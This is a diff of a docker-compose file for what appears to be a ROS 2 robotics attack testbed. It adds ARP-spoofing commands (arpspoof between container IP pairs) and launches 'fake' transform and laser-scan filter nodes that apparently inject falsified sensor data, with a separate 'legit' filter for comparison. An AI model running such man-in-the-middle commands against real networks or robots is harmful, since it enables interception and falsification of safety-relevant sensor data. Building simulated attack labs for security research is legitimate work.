@@ -156,18 +156,23 @@ services:
     command: >
       bash -lc "sleep 20 &&
       cd /ws &&
-      sudo mkdir -p /ws/src/logs &&
-      sudo touch /ws/src/logs/nftables.log &&
-      sudo chmod 666 /ws/src/logs/*.log &&
       source /opt/ros/jazzy/setup.bash &&
       source /ws/install/setup.bash &&
       ros2 launch fake_transform launch.fake_transform.py use_sim_time:=true &
       sleep 20 &&
-      sudo nft -f /etc/nftables.conf &&
-      sudo arpspoof -i eth0 -t 172.16.0.5 172.16.0.3 &
-      sudo arpspoof -i eth0 -t 172.16.0.3 172.16.0.5 &
+      nft -f /etc/nftables.conf &&
+      arpspoof -i eth0 -t 172.16.0.5 172.16.0.3 &
+      arpspoof -i eth0 -t 172.16.0.3 172.16.0.5 &
+      sleep 20 &&
+      arpspoof -i eth0 -t 172.16.0.1 172.16.0.8 &
+      arpspoof -i eth0 -t 172.16.0.8 172.16.0.1 &
+      source /ws/install/setup.bash &&
+      ros2 launch fake_object_filter scan_filter.launch.py use_sim_time:=true &&
       tail -f /dev/null"
 
+# sudo mkdir -p /ws/src/logs &&
+# sudo touch /ws/src/logs/nftables.log &&
+# sudo chmod 666 /ws/src/logs/*.log &&
 
   laser_filter:
     container_name: laser_filter
@@ -189,7 +194,7 @@ services:
       bash -lc "source /opt/ros/jazzy/setup.bash &&
                 source /ws/install/setup.bash &&
                 cd /ws &&
-                ros2 launch fake_object_filter scan_filter.launch.py use_sim_time:=true &&
+                ros2 launch legit_filter legit_filter.launch.py use_sim_time:=true &&
                 tail -f /dev/null"
 
 
